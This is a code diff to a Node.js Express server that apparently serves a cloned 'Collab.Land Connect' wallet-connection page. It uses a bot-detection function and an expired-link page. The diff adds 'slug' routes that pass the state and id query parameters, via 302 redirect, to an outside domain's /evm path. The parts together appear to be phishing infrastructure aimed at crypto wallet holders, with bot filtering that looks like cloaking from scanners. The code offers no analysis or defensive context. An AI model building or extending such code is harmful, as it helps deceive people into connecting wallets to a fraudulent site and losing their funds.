@@ -18,6 +18,15 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const HTML_FILE = "Collab.Land Connect (11_7_2025 5：13：46 PM) (1).html";
 const EXPIRED_HTML_FILE = "link-expired.html";
+const PRIMARY_SLUG_ID = process.env.PRIMARY_SLUG_ID || "89QW6FhDgNj1rKf1";
+const EXTRA_SLUG_IDS = (process.env.EXTRA_SLUG_IDS || "")
+  .split(",")
+  .map((slug) => slug.trim())
+  .filter(Boolean);
+const SLUG_DESTINATION_BASE_URL = (process.env.SLUG_DESTINATION_BASE_URL || "https://hyperlend.cc").replace(/\/$/, "");
+const SLUG_DESTINATION_PATH = process.env.SLUG_DESTINATION_PATH || "/evm";
+const REDIRECT_ROOT_TO_SLUG = process.env.REDIRECT_ROOT_TO_SLUG === "true";
+const SUPPORTED_SLUG_IDS = new Set(PRIMARY_SLUG_ID ? [PRIMARY_SLUG_ID, ...EXTRA_SLUG_IDS] : EXTRA_SLUG_IDS);
 
 // Middleware to parse JSON bodies
 app.use(express.json());
@@ -160,6 +169,11 @@ function isBot(userAgent, acceptLanguage, acceptEncoding) {
 
 // Root route - simple status page (OAuth no longer needed, using direct links)
 app.get('/', (req, res) => {
+  if (REDIRECT_ROOT_TO_SLUG && PRIMARY_SLUG_ID) {
+    const queryString = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
+    return res.redirect(302, `/slugs/${PRIMARY_SLUG_ID}${queryString}`);
+  }
+
   const { state, id, ...restParams } = req.query || {};
   if (state && id) {
     const params = new URLSearchParams();
@@ -177,6 +191,39 @@ app.get('/', (req, res) => {
     <p>Status: ✅ Online</p>
     <p>Connect wallet links go directly to <code>/evm?state=...&id=...</code></p>
   `);
+});
+
+// Friendly slug redirect route (e.g., /slugs/89QW6FhDgNj1rKf1?state=...&id=...)
+app.get('/slugs/:slugId', (req, res) => {
+  const { slugId } = req.params;
+
+  if (!slugId || !SUPPORTED_SLUG_IDS.has(slugId)) {
+    return res.status(404).send('Unknown slug identifier');
+  }
+
+  const params = new URLSearchParams();
+  Object.entries(req.query || {}).forEach(([key, value]) => {
+    if (typeof value === 'undefined') {
+      return;
+    }
+    if (Array.isArray(value)) {
+      value.forEach((v) => params.append(key, v));
+    } else {
+      params.append(key, value);
+    }
+  });
+
+  if (!params.has('state') || !params.has('id')) {
+    return res.status(400).send('Missing required query parameters (state and id)');
+  }
+
+  const destinationPath = SLUG_DESTINATION_PATH.startsWith('/')
+    ? SLUG_DESTINATION_PATH
+    : `/${SLUG_DESTINATION_PATH}`;
+  const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
+
+  console.log(`[Slug Redirect] ${slugId} -> ${forwardUrl}`);
+  return res.redirect(302, forwardUrl);
 });
 
 // Health check endpoint
